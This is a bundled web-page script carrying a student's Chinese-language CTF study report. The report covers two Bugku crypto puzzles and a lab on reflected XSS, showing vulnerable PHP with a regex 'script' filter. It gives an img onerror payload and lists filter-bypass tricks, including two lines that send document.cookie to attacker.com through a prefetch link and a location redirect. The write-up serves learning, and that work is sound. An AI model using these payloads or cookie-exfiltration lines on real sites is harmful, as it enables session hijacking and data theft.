(window.webpackJsonp=window.webpackJsonp||[]).push([[478],{2308:function(s,t,a){"use strict";a.r(t);var n=a(75),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"陈励文学习报告04"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#陈励文学习报告04"}},[s._v("#")]),s._v(" 陈励文学习报告04")]),s._v(" "),a("h3",{attrs:{id:"bugku你以为是md5吗"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#bugku你以为是md5吗"}},[s._v("#")]),s._v(" Bugku你以为是md5吗")]),s._v(" "),a("p",[s._v("试着用md5解密后发现密文错误，于是去搜了一下md5的加密方式")]),s._v(" "),a("p",[s._v("32位16进制字符串，于是修改了一下密文，得出flag")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s1.328888.xyz/2022/04/09/XaP1k.png",alt:"XaP1k.png"}})]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s1.328888.xyz/2022/04/09/XkUdQ.png",alt:"XkUdQ.png"}})]),s._v(" "),a("h3",{attrs:{id:"bugkumath-english"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#bugkumath-english"}},[s._v("#")]),s._v(" Bugkumath&english")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s1.328888.xyz/2022/04/09/XkuE4.png",alt:"XkuE4.png"}})]),s._v(" "),a("p",[s._v("计算完后，根据题目提示搜了一下发现是元音码表，转换后得到flag")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s1.328888.xyz/2022/04/09/XkfbX.png",alt:"XkfbX.png"}})]),s._v(" "),a("h3",{attrs:{id:"反射的xss源"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#反射的xss源"}},[s._v("#")]),s._v(" 反射的XSS源")]),s._v(" "),a("p",[s._v("源码")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("\n"),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("header")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"X-XSS-Protection: 0"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// Is there any input?")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("array_key_exists")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"name"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'name'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("NULL")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// Get input")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$name")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("preg_replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("''")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'name'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// Feedback for end user")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"<pre>Hello ${name}</pre>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br")])]),a("p",[s._v("正则表达式：将输入的"),a("strong",[s._v("script")]),s._v("全部过滤掉，于是所有包含"),a("strong",[s._v("script")]),s._v("的代码都不可执行。")]),s._v(" "),a("p",[s._v("使用CSP的方法进行绕过")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("script-src：外部脚本\nstyle-src：样式表\nimg-src：图像\nmedia-src：媒体文件（音频和视频）\nfont-src：字体文件\nobject-src：插件（比如 Flash）\nchild-src：框架\nframe-ancestors：嵌入的外部资源（比如<frame>、<iframe>、<embed>和<applet>）\nconnect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）\nworker-src：worker脚本\nmanifest-src：manifest 文件\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[s._v("构造payload")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<img src=" " onerror="alert(\'XSS\')"> \n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("**htmlspecialchars()**函数")]),s._v(" "),a("p",[s._v('把预定义的字符 "<" （小于）和 ">" （大于）转换为 HTML 实体')]),s._v(" "),a("p",[a("img",{attrs:{src:"https://s1.328888.xyz/2022/04/09/Xnpg7.png",alt:"Xnpg7.png"}})]),s._v(" "),a("h3",{attrs:{id:"一些绕过方法"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#一些绕过方法"}},[s._v("#")]),s._v(" 一些绕过方法")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<link rel="prefetch" href="http://baidu.com"> H5预加载，仅Google Chrome支持\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<link rel="dns-prefetch" href="http://baidu.com"> DNS预加载\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("当传出数据受限时，可以利用JavaScript动态生成link标签，将数据传输到我们的服务器，如通过GET参数带出cookie：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<link rel="prefetch" href="http://attacker.com/?cookie=xxxx">\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("利用页面跳转，包括a标签的跳转、location变量赋值的跳转，meta标签的跳转等手法。比如，通过跳转实现带出数据：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('location.href="http://attacker.com/?c="+escape(document.cookie)\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])])])}),[],!1,null,null,null);t.default=e.exports}}]);